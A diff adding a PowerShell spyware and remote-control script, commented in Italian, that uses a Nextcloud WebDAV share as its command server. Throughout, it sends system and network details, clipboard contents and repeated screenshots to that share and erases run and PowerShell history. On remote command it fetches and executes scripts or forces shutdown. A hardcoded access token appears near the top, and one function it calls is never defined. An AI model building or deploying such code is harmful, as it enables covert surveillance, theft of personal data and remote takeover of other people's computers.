@@ -1,0 +1,486 @@
+Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+
+$AccessToken = "mwgwxBBRLwxCeGj"
+
+function Nextcloud-Upload {
+
+	[CmdletBinding()]
+	param ($SourceFilePath, $AccessToken)
+
+	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+	$nextcloudUrl = "https://liv.nl.tab.digital/"
+	$file = $SourceFilePath
+	$fileObject = Get-Item $file
+
+	$headers = @{
+		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
+		"X-Requested-With"="XMLHttpRequest";
+	}
+
+	$pcFolder = "$($nextcloudUrl)/public.php/webdav/$env:computername"
+
+	try {
+		Invoke-RestMethod -Uri $pcFolder -Headers $headers -Method Head -ErrorAction SilentlyContinue # controllo se esiste la cartella con lo stesso nome del computer
+		if(((Split-Path $SourceFilePath -Leaf).Split('\') | Select-Object -Last 1) -eq "command.txt"){ # controllo se il file che voglio caricare si chiama command.txt
+			Throw
+		}
+		$webdavUrl = "$($nextcloudUrl)/public.php/webdav/$env:computername/$($fileObject.Name)"
+	}
+	catch {
+		$webdavUrl = "$($nextcloudUrl)/public.php/webdav/$($fileObject.Name)"
+	}
+
+	Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put
+}
+function Nextcloud-Download {
+
+    [CmdletBinding()]
+    param ($FileName, $AccessToken, $destinationFolder)
+
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+    $nextcloudUrl = "https://liv.nl.tab.digital/"
+	$fileUrl = "$nextcloudUrl/public.php/webdav/$FileName"
+
+    $headers = @{
+		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
+		"X-Requested-With"="XMLHttpRequest";
+	}
+
+	try{
+		Invoke-RestMethod -Uri $fileUrl -Headers $headers -OutFile $destinationFolder
+	}
+	catch{
+		Write-Host ""
+	}
+}
+function Nextcloud-OpenFile {
+
+    [CmdletBinding()]
+    param ($FileName, $AccessToken)
+
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+    $nextcloudUrl = "https://liv.nl.tab.digital/"
+	$fileUrl = "$nextcloudUrl/public.php/webdav/$FileName"
+
+    $headers = @{
+		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
+		"X-Requested-With"="XMLHttpRequest";
+	}
+
+	try{
+		Invoke-RestMethod -Uri $fileUrl -Headers $headers -Method Get
+	}
+	catch{
+		Write-Host ""
+	}
+}
+function Github-Download{
+	[CmdletBinding()]
+	param ($ScriptUrl, $destinationFolder)
+
+	$nameScript = (Split-Path $ScriptUrl -Leaf).Split('/') | Select-Object -Last 1
+
+	Write-Host "ScriptUrl: " $ScriptUrl
+	Write-Host "nameScript: " $nameScript
+	Invoke-WebRequest -Uri $ScriptUrl -OutFile "$destinationFolder\$nameScript"
+
+	return $nameScript
+}
+function Get-ComputerInformation {
+
+    Try { #Begin Try
+
+        #Null out variables used in the function
+        #This isn't needed, but I like to declare variables up top
+        $adminPasswordStatus = $null
+        $thermalState        = $null
+		$pcSystemType		 = $null
+        $cimSession          = $null
+        $computerObject      = $null
+        $errorMessage        = $null
+
+        #This will be used when errors are encountered
+        $unableMsg           = 'Unable to determine'
+
+        #Gather information using Get-CimInstance
+        #ErrorAction is set to Stop here, so we can catch any errors
+        $osInfo       = Get-CimInstance Win32_OperatingSystem -ErrorAction Stop
+        $computerInfo = Get-CimInstance Win32_ComputerSystem  -ErrorAction Stop
+        $diskInfo     = Get-CimInstance Win32_LogicalDisk     -ErrorAction Stop
+
+        #Use a switch to get the text value based on the number in $computerInfo.AdminPasswordStatus
+        Switch ($computerInfo.AdminPasswordStatus) {
+
+			0 {$adminPasswordStatus = 'Disabled'}
+			1 {$adminPasswordStatus = 'Enabled'}
+			2 {$adminPasswordStatus = 'Not Implemented'}
+			3 {$adminPasswordStatus = 'Unknown'}
+            Default {$adminPasswordStatus = 'Unable to determine'}
+
+        }
+
+        #Use a switch to get the text value based on the number in $computerInfo.ThermalState
+        Switch ($computerInfo.ThermalState) {
+
+			1 {$thermalState = 'Other'}
+			2 {$thermalState = 'Unknown'}
+			3 {$thermalState = 'Safe'}
+			4 {$thermalState = 'Warning'}
+			5 {$thermalState = 'Critical'}
+			6 {$thermalState = 'Non-recoverable'}
+            Default {$thermalState = 'Unable to determine'}
+
+        }
+
+		Switch ($computerInfo.PCSystemType) {
+
+			0 {$pcSystemType = 'Unspecified'}
+			1 {$pcSystemType = 'Desktop'}
+			2 {$pcSystemType = 'Mobile'}
+			3 {$pcSystemType = 'Workstation'}
+			4 {$pcSystemType = 'Enterprise Server'}
+			5 {$pcSystemType = 'Small Office and Home Office (SOHO) Server'}
+			6 {$pcSystemType = 'Appliance PC'}
+			7 {$pcSystemType = 'Performance Server'}
+			8 {$pcSystemType = 'Maximum'}
+            Default {$pcSystemType = 'Unable to determine'}
+
+        }
+
+        #Create the object
+        $computerObject = [PSCustomObject]@{
+
+            ComputerName        = $computerInfo.Name
+            OS                  = $osInfo.Caption
+            'OS Version'        = $("$($osInfo.Version) Build $($osInfo.BuildNumber)")
+            Domain              = $computerInfo.Domain
+            Workgroup           = $computerInfo.Workgroup
+            DomainJoined        = $computerInfo.PartOfDomain
+            Disks               = $diskInfo
+            AdminPasswordStatus = $adminPasswordStatus
+            ThermalState        = $thermalState
+			Manufacturer		= $computerInfo.Manufacturer
+			Model				= $computerInfo.Model
+			PCSystemType		= $pcSystemType
+            Error               = $false
+            ErrorMessage        = $null
+
+        }
+
+
+        #Return the object created
+        Return $computerObject
+
+    } #End Try
+
+    Catch { #Begin Catch
+
+        #Capture the exception message in the $errorMessage variable
+        $errorMessage = $_.Exception.Message
+
+        #Create the custom object with the error message
+        $computerObject = [PSCustomObject]@{
+
+            ComputerInput       = $computerName
+            ComputerName        = $unableMsg
+            OS                  = $unableMsg
+            'OS Version'        = $unableMsg
+            Domain              = $unableMsg
+            Workgroup           = $unableMsg
+            DomainJoined        = $unableMsg
+            Disks               = $unableMsg
+            AdminPasswordStatus = $unableMsg
+            ThermalState        = $unableMsg
+            Error               = $true
+            ErrorMessage        = $errorMessage
+
+        }
+
+        Write-Host `n"Error encountered [$errorMessage]!"`n -ForegroundColor Red -BackgroundColor DarkBlue
+
+        #Return the object created
+        Return $computerObject
+
+        #Stop processing commands
+        Break
+
+    } #End Catch
+
+}
+function json_reader {
+
+	[CmdletBinding()]
+    param ($FileName)
+
+	$json = Get-Content $FileName | Out-String | ConvertFrom-Json
+
+	$configObject = [PSCustomObject]@{
+
+		Operations = $json.operations
+		TimeStart = $json.time_start
+		TimeEnd = $json.time_end
+		NetworkMapping = $json.network_mapping
+		WifiDump = $json.wifi_dump
+		ScreenShots = $json.screenshots
+		Keylogger = $json.Keylogger
+		InfoComputer = $json.info_computer
+		DefaultScripts = $json.default_scripts
+		DeleteHistory = $json.delete_history
+		Clipboard = $json.clipboard
+		Interval = $json.interval
+		CommandControl = $json.command_control
+		NumberScreenshot = $json.number_screenshot
+		Scripts = $json.scripts
+		String = $json.string
+
+	}
+
+	return $configObject
+}
+function Delete-Files {
+
+	$path = "C:\Users\$env:computername\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
+	Remove-Item -Path "$path\ScriptFolder" -Recurse
+	Remove-Item "$path\Startup\avvio.vbs" -Force
+}
+function ExecuteJob{
+
+	[CmdletBinding()]
+    param ($nameScript)
+
+    # Crea un nuovo job per eseguire lo script
+    $job = Start-Job -ScriptBlock {
+        param($Path)
+        Invoke-Expression -Command "& $Path"
+    } -ArgumentList $nameScript
+
+    # Restituisci l'oggetto del job
+    return $job
+}
+
+# ========================================================================================================================= #
+
+# CARICA FILE DI CONFIGURAZIONE
+	Nextcloud-Download -FileName "config.json" -AccessToken $AccessToken -destinationFolder "$PSScriptRoot/config.json"
+	$config = json_reader -FileName "$PSScriptRoot\config.json"
+
+# ========================================================================================================================= #
+
+# CARICA FILE INFO COMPUTER
+	if($config.InfoComputer){
+		[System.Collections.ArrayList]$computerArray = @()
+		$computerArray.Add((Get-ComputerInformation -computerName $computer)) | Out-Null
+
+		$date = (Get-Date).ToString("yyyy.MM.dd")
+		$time = (Get-Date).ToString("HH.mm.ss")
+		$outputFile = "$PSScriptRoot\computer_info-$date-$time.txt"
+
+		$computerArray | Out-File -FilePath $outputFile -Encoding UTF8
+		Nextcloud-Upload -SourceFilePath $outputFile -AccessToken $AccessToken
+		Remove-Item $outputFile
+	}
+
+# ========================================================================================================================= #
+
+# CANCELLA CRONOLOGIA
+	if($config.DeleteHistory){
+
+		# cronologia esegui
+		$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+		if (Test-Path $regKey) {
+			Remove-ItemProperty -Path $regKey -Name '*' -ErrorAction SilentlyContinue
+		}
+
+		# cronologia powershell
+		[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+		[System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}')
+	}
+
+# =========================================================================================================================
+
+# CREAZIONE FILE IP
+	if($config.NetworkMapping){
+		$publicIP   = Invoke-RestMethod -Uri "https://api.ipify.org?format=text"
+		$privateIP  = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Manual' }).IPAddress
+
+		$date = (Get-Date).ToString("yyyy.MM.dd")
+		$time = (Get-Date).ToString("HH.mm.ss")
+		$outputFile = "$PSScriptRoot\ip-$date-$time.txt"
+
+		$ipContent = @"
+		Indirizzo IP pubblico: $publicIP
+		Indirizzo IP privato: $privateIP
+"@
+
+		$ipContent | Out-File -FilePath $outputFile -Encoding UTF8
+		Nextcloud-Upload -SourceFilePath $outputFile -AccessToken $AccessToken
+		Remove-Item $outputFile
+	}
+
+# =========================================================================================================================
+
+# ESEGUI SCRIPTS DEL FILE DI CONFIGURAZIONE
+	if($config.DefaultScripts){
+		if($config.Scripts -ne ""){
+			foreach($scriptUrl in $config.Scripts){
+				DownloadExecute-Script -ScriptUrl $ScriptUrl
+			}
+		}
+	}
+
+# =========================================================================================================================
+
+$temp = 0
+$p1   = [System.Windows.Forms.Cursor]::Position
+$runScreen  = $true
+$n = 0
+$repeatCode = ""
+
+while ($n -clt $config.NumberScreenshot -or $config.NumberScreenshot -eq 0) {
+
+	$now = Get-Date
+
+	# ===================================================================================================================== #
+
+	# CONTROLLO FILE DEI COMANDI
+	if([int]$temp % ([int]$config.Interval * [int]$config.CommandControl) -eq 0 -or $temp -eq 0){ # ogni n screen verifica se il file dei comandi è cambiato
+		$command = Nextcloud-OpenFile -FileName "command.txt" -AccessToken $AccessToken
+		$command = $command.split(" ")
+		if($command[1] -ne 0 -and $command[1] -ne "" -and $repeatCode -eq ""){
+			$repeatCode = $command[1]
+		}
+
+		# controllo quante volte deve essere eseguito ancora il comando
+		if($command -ne "" -and $command[1] -ne 0 -and $command.Count -ge 1){
+			if($repeatCode -cgt 1){
+				$repeatCode -= 1
+			}else{
+				"" | Out-File -FilePath "$PSScriptRoot\command.txt" -Encoding UTF8
+				Nextcloud-Upload -SourceFilePath "$PSScriptRoot\command.txt" -AccessToken $AccessToken
+				Remove-Item "$PSScriptRoot\command.txt"
+				$repeatCode = ""
+			}
+		}
+
+		# controllo il comando da eseguire
+		Write-Host "command: " $command
+		if($command[0] -eq $env:computername+":pauseScreen" -or $command[0] -eq "pauseScreen"){
+			$runScreen = $false
+		}
+		if($command[0] -eq $env:computername+":startScreen" -or $command[0] -eq "startScreen"){
+			$runScreen = $true
+		}
+		if($command[0] -eq $env:computername+":stopScript" -or $command[0] -eq "stopScript"){
+			break
+		}
+		if($command[0] -eq $env:computername+":clearFiles" -or $command[0] -eq "clearFiles"){
+			Delete-Files
+		}
+		if($command[0] -eq $env:computername+":offPC" -or $command[0] -eq "offPC"){
+			Stop-Computer -Force
+		}
+		if($command[0] -eq $env:computername+":restartPC" -or $command[0] -eq "restartPC"){
+			Restart-Computer -Force
+		}
+		if($command[0] -eq $env:computername+":runCode" -or $command[0] -eq "runCode"){
+			if($command[2] -eq "numberCode"){
+				$code = Github-Download -ScriptUrl $config.Scripts[$command[3]-1] -destinationFolder $PSScriptRoot
+				Start-Sleep -Seconds 2
+			}else{
+				$code = $command[2]
+				Nextcloud-Download -FileName "scripts/$code" -AccessToken $AccessToken -destinationFolder "$PSScriptRoot\$code"
+			}
+			$job = ExecuteJob -nameScript "$PSScriptRoot\$code"
+
+			Wait-Job -Job $job | Out-Null
+			$result = Receive-Job -Job $job
+			Remove-Job -Job $job | Out-Null
+			# Remove-Item -Path "$PSScriptRoot\$code" -Force
+		}
+	}
+
+	# ===================================================================================================================== #
+
+	# CREAZIONE FILE CLIPBOARD CONTENT
+	if($config.Clipboard){
+		$fileContent = @()
+		$date = (Get-Date).ToString("dd/MM/yyyy")
+		$time = (Get-Date).ToString("HH:mm:ss")
+
+		$cloudfileContent = Nextcloud-OpenFile -FileName "clipboard.txt" -AccessToken $AccessToken # contenuto del file caricato sul cloud
+		$clipboardContent = [System.Windows.Forms.Clipboard]::GetText() # nuovo contenuto del file
+
+		$fileContent += $cloudfileContent
+		$fileContent += "# ===== $date - $time ============================== #"
+		$fileContent += "$clipboardContent`n"
+
+		$outputFile = Join-Path $PSScriptRoot "$env:computername-clipboard.txt"
+
+		$fileContent | Out-File -FilePath $outputFile -Encoding UTF8
+		Nextcloud-Upload -SourceFilePath $outputFile -AccessToken $AccessToken
+		Remove-Item $outputFile
+	}
+
+	# ===================================================================================================================== #
+
+	# CREA SCREEN DELLO SCHERMO
+	if ($now -ge $config.TimeStart -and $now -lt $config.TimeEnd -and $runScreen -and $config.ScreenShots) {
+
+		# Crea e salva gli screen ogni 5 secondi
+		$screens = [Windows.Forms.Screen]::AllScreens
+
+		$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
+		$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
+		$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
+		$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+
+		$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+		$bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
+		$graphics = [Drawing.Graphics]::FromImage($bmp)
+
+		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+
+		$date = (Get-Date).ToString("yyyy.MM.dd")
+		$time = (Get-Date).ToString("HH.mm.ss")
+		$bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$date-$time.png")
+		$graphics.Dispose()
+		$bmp.Dispose()
+
+		$sourcePath = "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture-$date-$time.png"
+		Nextcloud-Upload -SourceFilePath $sourcePath -AccessToken $AccessToken
+
+		# verifico se il mouse si sta muovendo ogni 10 min
+		if ($temp -eq 600) {
+
+			$p2 = [System.Windows.Forms.Cursor]::Position
+			if ($p1.X -eq $p2.X -and $p1.Y -eq $p2.Y) {
+
+				# attendo che vengano rilevati nuovi movimenti del mouse
+				$attendi = $true
+				while($attendi){
+					$p1 = [System.Windows.Forms.Cursor]::Position
+					Start-Sleep -Seconds $config.Interval
+					$p2 = [System.Windows.Forms.Cursor]::Position
+
+					if($p1.X -ne $p2.X -or $p1.Y -ne $p2.Y){
+						$attendi = $false
+						$p1      = [System.Windows.Forms.Cursor]::Position
+						$temp    = 0
+					}
+				}
+
+			} else {
+				$p1   = [System.Windows.Forms.Cursor]::Position
+				$temp = 0
+			}
+
+		}
+
+		$n += 1
+		$temp += $config.Interval
+		Start-Sleep -Seconds $config.Interval
+	}
+}
